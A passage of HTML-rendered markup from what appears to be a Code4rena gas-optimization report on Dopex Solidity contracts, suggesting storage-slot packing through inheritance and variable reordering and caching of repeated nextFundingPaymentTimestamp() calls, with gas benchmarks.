class=\"mtk8\">-  /// @dev the timestamp of the last update where funding was paid for</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  uint256 public lastUpdateTime;</span></span></span></code></pre>\n<h3 id=\"reordering-the-order-of-inheritance-can-help-us-pack-one-more-variable\" style=\"position:relative;\"><a href=\"#reordering-the-order-of-inheritance-can-help-us-pack-one-more-variable\" aria-label=\"reordering the order of inheritance can help us pack one more variable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Reordering the order of inheritance can help us pack one more variable</h3>\n<p><a href=\"https://docs.soliditylang.org/en/v0.8.21/internals/layout_in_storage.html\">From the docs</a>:“For contracts that use inheritance, the ordering of state variables is determined by the C3-linearized order of contracts starting with the most base-ward contract. If allowed by the above rules, state variables from different contracts do share the same storage slot.”</p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L28-L98\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L28-L98</a></p>\n<h3 id=\"we-can-save-1-slot-here-by-packing-bool-_paused-from-the-contract-pausable-with-the-variable-collateraltoken-in-the-inheriting-contract-save-1-slot-2k-gas\" style=\"position:relative;\"><a href=\"#we-can-save-1-slot-here-by-packing-bool-_paused-from-the-contract-pausable-with-the-variable-collateraltoken-in-the-inheriting-contract-save-1-slot-2k-gas\" aria-label=\"we can save 1 slot here by packing bool _paused from the contract pausable with the variable collateraltoken in the inheriting contract save 1 slot 2k gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>We can save 1 SLOT here by packing <code>bool _paused</code> from the contract <code>pausable</code> with the variable <code>collateralToken</code> in the inheriting contract. (Save 1 SLOT: 2K gas)</h3>\n<p><em>Part of this borrows some part from the above finding</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"107\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">perp</span><span class=\"mtk1\">-</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PerpetualAtlanticVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PerpetualAtlanticVault</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">IPerpetualAtlanticVault</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">ReentrancyGuard</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">Pausable</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">ERC721</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">ERC721Enumerable</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">ERC721Burnable</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">AccessControl</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">ContractWhitelist</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">42</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">Counters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Counter</span><span class=\"mtk1\"> </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tokenIdCounter</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk17\">&lt;</span><span class=\"mtk10\">Truncated</span><span class=\"mtk17\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">56:  /// @dev Collateral Token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">57:  IERC20WithBurn public collateralToken;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk17\">&lt;</span><span class=\"mtk10\">Truncated</span><span class=\"mtk17\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> 94: /// @dev genesis timestamp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> 95: uint256 public genesis;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk17\">&lt;</span><span class=\"mtk10\">Truncated</span><span class=\"mtk17\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">97:  /// @dev the timestamp of the last update where funding was paid for</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">98:  uint256 public lastUpdateTime;</span></span></span></code></pre>\n<p>In the contract <code>Pausable</code>  we have a state variable of type <code>boolean</code>. According to solidity docs, if allowed by the rules of inheritance, variables from different contracts can be packed together.\nThis would mean, we move the <code>Pausable</code> to be the last contract inherited so that the <code>bool _paused</code> from that contract can be packed with variables in the inheriting contract. I’ve moved the <code>collateralToken, genesis,lastUpdateTime</code> to the top of the contract so that the variable <code>_paused</code> is packed together with <code>collateralToken</code> as they are accessed in the same transaction</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"108\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> contract PerpetualAtlanticVault is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   IPerpetualAtlanticVault,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   ReentrancyGuard,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  Pausable,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   ERC721,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   ERC721Enumerable,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   ERC721Burnable,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   AccessControl,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  ContractWhitelist</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  ContractWhitelist,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  Pausable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   using SafeERC20 for IERC20WithBurn;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   using Counters for Counters.Counter;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  /// @dev Collateral Token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  IERC20WithBurn public collateralToken;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    /// @dev genesis timestamp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  uint40 public genesis;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  /// @dev the timestamp of the last update where funding was paid for</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  uint40 public lastUpdateTime;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   /// @dev Token ID counter for write positions</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   Counters.Counter private _tokenIdCounter;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -53,9 +60,6 @@ contract PerpetualAtlanticVault is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   /// @dev Contract addresses</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   Addresses public addresses;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  /// @dev Collateral Token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  IERC20WithBurn public collateralToken;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   /// @dev The precision of the collateral token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   uint256 public collateralPrecision;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -91,12 +95,6 @@ contract PerpetualAtlanticVault is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   /// @dev the total number of active options</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   uint256 public totalActiveOptions;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  /// @dev genesis timestamp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  uint256 public genesis;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  /// @dev the timestamp of the last update where funding was paid for</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  uint256 public lastUpdateTime;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L33-L67\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L33-L67</a></p>\n<h3 id=\"reorder-the-order-of-variable-declaration-to-allow-packing-variables-from-child-contracts-save-1-slot-2k-gas\" style=\"position:relative;\"><a href=\"#reorder-the-order-of-variable-declaration-to-allow-packing-variables-from-child-contracts-save-1-slot-2k-gas\" aria-label=\"reorder the order of variable declaration to allow packing variables from child contracts save 1 slot 2k gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Reorder the order of variable declaration to allow packing variables from child contracts (Save 1 SLOT: 2K gas)</h3>\n<p><strong>We can pack the variable <code>_paused</code> from the contract <code>Pausable</code> with the variable <code>isReLPActive and putOptionsRequired</code> in the inheriting contract</strong></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"109\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">33</span><span class=\"mtk1\">:</span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">RdpxV2Core</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">34</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">IRdpxV2Core</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">35</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">AccessControl</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">36</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">ContractWhitelist</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">37</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">ERC721Holder</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">38</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">Pausable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">39</span><span class=\"mtk1\">: {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">47</span><span class=\"mtk12\">:</span><span class=\"mtk1\">  </span><span class=\"mtk12\">Addresses</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">50</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">PricingOracleAddresses</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pricingOracleAddresses</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">115</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">isReLPActive</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">118</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">putOptionsRequired</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>By just moving the bools to the top, we allow the inherited variable <code>_paused</code> to be packed with the variables we’ve just moved to the top\n<em>There was a possibility of packing with address <code>weth</code> but this was suggested to be made immutable by the bot</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"110\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  /// @notice Whether reLP is active or not</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  bool public isReLPActive;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  /// @notice Whether put options are requred</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  bool public putOptionsRequired;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   /// @notice Addresses used by the contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   Addresses public addresses;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -111,12 +116,6 @@ contract RdpxV2Core is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   /// @notice Total weth delegated</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   uint256 public totalWethDelegated;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  /// @notice Whether reLP is active or not</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  bool public isReLPActive;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  /// @notice Whether put options are requred</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  bool public putOptionsRequired;</span></span></span></code></pre>\n<h2 id=\"g-04-function-calls-should-be-cached-instead-of-calling-them-more-than-once-in-same-transaction\" style=\"position:relative;\"><a href=\"#g-04-function-calls-should-be-cached-instead-of-calling-them-more-than-once-in-same-transaction\" aria-label=\"g 04 function calls should be cached instead of calling them more than once in same transaction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-04] Function calls should be cached instead of calling them more than once in same transaction</h2>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L594-L614\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L594-L614</a></p>\n<h3 id=\"result-of-nextfundingpaymenttimestamp-should-be-cached-instead-of-repeatedly-calling-it-save-777-gas-on-average\" style=\"position:relative;\"><a href=\"#result-of-nextfundingpaymenttimestamp-should-be-cached-instead-of-repeatedly-calling-it-save-777-gas-on-average\" aria-label=\"result of nextfundingpaymenttimestamp should be cached instead of repeatedly calling it save 777 gas on average permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Result of <code>nextFundingPaymentTimestamp()</code> should be cached instead of repeatedly calling it (Save 777 Gas on average)</h3>\n<p>Gas benchmarks based on function <code>Purchase()</code> which calls our private function <code>_updateFundingRate</code></p>\n<p><em><code>Test: Purchase(uint256,address)(uint256)</code></em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Min</th>\n<th>Average</th>\n<th>Median</th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>312368</td>\n<td>333657</td>\n<td>333657</td>\n<td>354946</td>\n</tr>\n<tr>\n<td>After</td>\n<td>311846</td>\n<td>332880</td>\n<td>332880</td>\n<td>353914</td>\n</tr>\n</tbody>\n</table>\n<p><em><code>Test: Purchase(uint256,address)(uint256,uint256)</code></em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Min</th>\n<th>Average</th>\n<th>Median</th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>17877</td>\n<td>256930</td>\n<td>221256</td>\n<td>359646</td>\n</tr>\n<tr>\n<td>After</td>\n<td>17877</td>\n<td>256498</td>\n<td>221256</td>\n<td>358614</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"111\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">perp</span><span class=\"mtk1\">-</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PerpetualAtlanticVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">594</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_updateFundingRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">595</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">fundingRates</span><span class=\"mtk1\">[</span><span class=\"mtk12\">latestFundingPaymentPointer</span><span class=\"mtk1\">] == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">596</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">597</span><span class=\"mtk1\">:      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">lastUpdateTime</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">nextFundingPaymentTimestamp</span><span class=\"mtk1\">() - </span><span class=\"mtk12\">fundingDuration</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">598</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">lastUpdateTime</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">599</span><span class=\"mtk1\">:      } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">600</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">nextFundingPaymentTimestamp</span><span class=\"mtk1\">() - </span><span class=\"mtk12\">fundingDuration</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">601</span><span class=\"mtk1\">:      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">602</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">endTime</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">nextFundingPaymentTimestamp</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">606</span><span class=\"mtk1\">:    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">607</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">lastUpdateTime</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">608</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">endTime</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">nextFundingPaymentTimestamp</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p>If we look into the implementation of the function <code>nextFundingPaymentTimestamp</code> which is being called several times, we can see we read three state variables <code>genesis,latestFundingPaymentPointer,fundingDuration</code>\n<a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L563-L569\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L563-L569</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"112\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span 